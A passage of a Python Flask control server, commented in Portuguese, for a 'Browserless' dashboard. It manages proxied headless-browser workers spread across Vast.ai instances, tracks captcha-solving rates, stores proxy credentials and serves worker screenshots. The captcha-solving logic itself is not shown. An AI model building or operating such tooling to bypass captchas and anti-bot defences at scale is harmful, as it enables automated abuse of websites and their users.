                  use_proxy, results_queue, mode_7k, mode_captcha)
        )
        thread.start()
    
    def generate():
        sent_count = 0
        while thread.is_alive() or sent_count < len(results_queue):
            while sent_count < len(results_queue):
                yield json.dumps(results_queue[sent_count]) + "\n"
                sent_count += 1
            time.sleep(0.1)
        
        while sent_count < len(results_queue):
            yield json.dumps(results_queue[sent_count]) + "\n"
            sent_count += 1
    
    return app.response_class(generate(), mimetype='application/x-ndjson')


@app.route("/api/stop-workers", methods=["POST"])
def api_stop_workers():
    """Define flag global para parar todos os workers (modo 7k e captcha)."""
    global workers_should_stop, captcha_should_stop
    with workers_stop_lock:
        workers_should_stop = True
    with captcha_stop_lock:
        captcha_should_stop = True
    return jsonify({"status": "requested", "message": "Workers serão parados"})


@app.route("/api/captcha-stats", methods=["GET"])
def api_captcha_stats():
    """Retorna estatísticas dos captchas resolvidos."""
    try:
        with captcha_stats_lock:
            elapsed = 0
            rate = 0
            if captcha_stats["start_time"]:
                elapsed = time.time() - captcha_stats["start_time"]
                if elapsed > 0:
                    rate = captcha_stats["solved"] / (elapsed / 60)
            
            return jsonify({
                "success": True,
                "solved": captcha_stats["solved"],
                "failed": captcha_stats["failed"],
                "reloads": captcha_stats["reloads"],
                "elapsed_seconds": round(elapsed, 1),
                "elapsed_minutes": round(elapsed / 60, 1),
                "rate_per_minute": round(rate, 1)
            })
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500


@app.route("/api/reset-captcha-stats", methods=["POST"])
def api_reset_captcha_stats():
    """Reseta as estatísticas de captcha."""
    global captcha_stats
    try:
        with captcha_stats_lock:
            captcha_stats["solved"] = 0
            captcha_stats["failed"] = 0
            captcha_stats["reloads"] = 0
            captcha_stats["start_time"] = None
        return jsonify({"success": True, "message": "Estatísticas resetadas"})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


CONFIG_FILE = "browserless_config.json"


@app.route("/api/save-config", methods=["POST"])
def api_save_config():
    """Salva as configurações em arquivo JSON."""
    try:
        data = request.get_json()
        config = {
            "ws_endpoint": data.get("ws_endpoint", ""),
            "proxy_server": data.get("proxy_server", ""),
            "proxy_username": data.get("proxy_username", ""),
            "proxy_password": data.get("proxy_password", ""),
            "default_url": data.get("default_url", ""),
            "default_workers": data.get("default_workers", 20),
            "use_proxy": data.get("use_proxy", True)
        }
        
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(config, f, indent=2, ensure_ascii=False)
        
        return jsonify({"status": "success", "message": "Configuração salva com sucesso!"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/load-config", methods=["GET"])
def api_load_config():
    """Carrega as configurações salvas do arquivo JSON."""
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                config = json.load(f)
            return jsonify({"status": "success", "config": config})
        else:
            return jsonify({"status": "not_found", "config": None})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/sync-vast-ai", methods=["POST"])
def api_sync_vast_ai():
    """Busca instâncias running na Vast.ai e retorna servidores para adicionar.
    
    Segue o formato do curl:
    curl --request GET \
      --url https://console.vast.ai/api/v0/instances/ \
      --header 'Authorization: Bearer <token>'
    """
    try:
        # Fazer requisição GET para a API da Vast.ai (formato curl)
        headers = {
            "Authorization": f"Bearer {VAST_AI_API_KEY}"
        }
        
        response = requests.get(VAST_AI_API_URL, headers=headers, timeout=30)
        response.raise_for_status()
        
        data = response.json()
        instances = data.get("instances", [])
        
        # Filtrar apenas instâncias com status "running"
        running_instances = [
            inst for inst in instances 
            if inst.get("actual_status") == "running" or inst.get("cur_state") == "running"
        ]
        
        # Criar lista de servidores a partir das instâncias running
        servers_to_add = []
        for instance in running_instances:
            public_ip = instance.get("public_ipaddr")
            instance_id = instance.get("id")
            label = instance.get("label", f"Instance {instance_id}")
            
            if public_ip:
                # Buscar porta mapeada para 3000/tcp (porta interna do Browserless)
                ports = instance.get("ports", {})
                browserless_port = None
                
                # Procurar por "3000/tcp" no mapeamento de portas
                port_key = f"{BROWSERLESS_INTERNAL_PORT}/tcp"
                if port_key in ports:
                    port_mappings = ports[port_key]
                    if port_mappings and len(port_mappings) > 0:
                        browserless_port = port_mappings[0].get("HostPort")
                
                # Se encontrou a porta mapeada, usar ela + /chrome
                # Caso contrário, usar porta padrão
                if browserless_port:
                    ws_endpoint = f"ws://{public_ip}:{browserless_port}/chrome"
                else:
                    # Fallback: usar porta padrão se não encontrar mapeamento
                    ws_endpoint = f"ws://{public_ip}:{DEFAULT_BROWSERLESS_PORT}/chrome"
                
                # Buscar memória da máquina (cpu_ram está em MB segundo a documentação da Vast.ai)
                cpu_ram_mb = instance.get("cpu_ram")
                if cpu_ram_mb is None:
                    cpu_ram_mb = 0
                
                # Calcular número de workers baseado na memória: 1 worker para cada 500 MB
                # Garantir que seja pelo menos 1 worker e um número inteiro
                num_workers = max(1, int(cpu_ram_mb / 500)) if cpu_ram_mb > 0 else 20  # Fallback para 20 se não tiver info de memória
                
                servers_to_add.append({
                    "endpoint": ws_endpoint,
                    "workers": num_workers,  # Calculado baseado na memória da máquina
                    "label": label,
                    "instance_id": instance_id,
                    "ip": public_ip,
                    "port": browserless_port or DEFAULT_BROWSERLESS_PORT,
                    "cpu_ram_mb": cpu_ram_mb,  # Incluir informação de memória
                    "cpu_ram_gb": round(cpu_ram_mb / 1024, 2) if cpu_ram_mb else 0  # Memória em GB para exibição
                })
        
        return jsonify({
            "status": "success",
            "total": len(running_instances),
            "added": len(servers_to_add),
            "servers": servers_to_add
        })
        
    except requests.exceptions.RequestException as e:
        return jsonify({
            "status": "error",
            "message": f"Erro ao conectar com Vast.ai: {str(e)}"
        }), 500
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": f"Erro: {str(e)}"
        }), 500


@app.route("/api/worker-screenshot/<int:worker_id>", methods=["GET"])
def api_worker_screenshot(worker_id):
    """Retorna screenshot de um worker específico."""
    try:
        with screenshots_lock:
            screenshot_data = worker_screenshots.get(worker_id)
            
            if screenshot_data:
                return jsonify({
                    "success": True,
                    "worker_id": worker_id,
                    "screenshot": screenshot_data["screenshot"],
                    "url": screenshot_data["url"],
                    "title": screenshot_data["title"],
                    "timestamp": screenshot_data["timestamp"]
                })
            else:
                return jsonify({
                    "success": False,
                    "error": "Screenshot não encontrado para este worker"
                }), 404
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500


@app.route("/api/all-screenshots", methods=["GET"])
def api_all_screenshots():
    """Retorna todos os screenshots disponíveis."""
    try:
        with screenshots_lock:
            screenshots = {}
            for worker_id, data in worker_screenshots.items():
                screenshots[worker_id] = {
                    "url": data["url"],
                    "title": data["title"],
                    "timestamp": data["timestamp"],
                    "has_screenshot": bool(data.get("screenshot"))
                }
            
            return jsonify({
                "success": True,
                "screenshots": screenshots,
                "total": len(screenshots)
            })
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500


@app.route("/api/clear-screenshots", methods=["POST"])
def api_clear_screenshots():
    """Limpa todos os screenshots armazenados."""
    try:
        with screenshots_lock:
            worker_screenshots.clear()
            return jsonify({
                "success": True,
                "message": "Screenshots limpos com sucesso"
            })
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500


@app.route("/api/toggle-screenshots", methods=["POST"])
def api_toggle_screenshots():
    """Ativa ou desativa a captura de screenshots."""
    global capture_screenshots_enabled
    try:
        data = request.get_json()
        enabled = data.get("enabled", True)
        
        with screenshots_enabled_lock:
            capture_screenshots_enabled = enabled
        
        return jsonify({
            "success": True,
            "enabled": capture_screenshots_enabled,
            "message": "Captura de screenshots " + ("ativada" if enabled else "desativada")
        })
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500


@app.route("/api/toggle-logs", methods=["POST"])
def api_toggle_logs():
    """Ativa ou desativa os logs."""
    global logs_enabled
    try:
        data = request.get_json()
        enabled = data.get("enabled", True)
        
        with logs_enabled_lock:
            logs_enabled = enabled
        
        return jsonify({
            "success": True,
            "enabled": logs_enabled,
            "message": "Logs " + ("ativados" if enabled else "desativados")
        })
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500


@app.route("/api/logs-enabled", methods=["GET"])
def api_logs_enabled():
    """Retorna o estado atual dos logs."""
    try:
        with logs_enabled_lock:
            return jsonify({
                "success": True,
                "enabled": logs_enabled
            })
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500


@app.route("/api/screenshots-enabled", methods=["GET"])
def api_screenshots_enabled():
    """Retorna o estado atual da captura de screenshots."""
    try:
        with screenshots_enabled_lock:
            return jsonify({
                "success": True,
                "enabled": capture_screenshots_enabled
            })
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500


if __name__ == "__main__":
    print("\n" + "=" * 60)
    print("🌐 BROWSERLESS DASHBOARD v3 - CUSTOM SERVER")
    print("=" * 60)
    print(f"📍 Acesse: http://localhost:5090")
    print(f"🖥️ Endpoint padrão: {DEFAULT_WS_ENDPOINT}")
    print("=" * 60 + "\n")
    
    app.run(host="0.0.0.0", port=5090, debug=False, threaded=True)

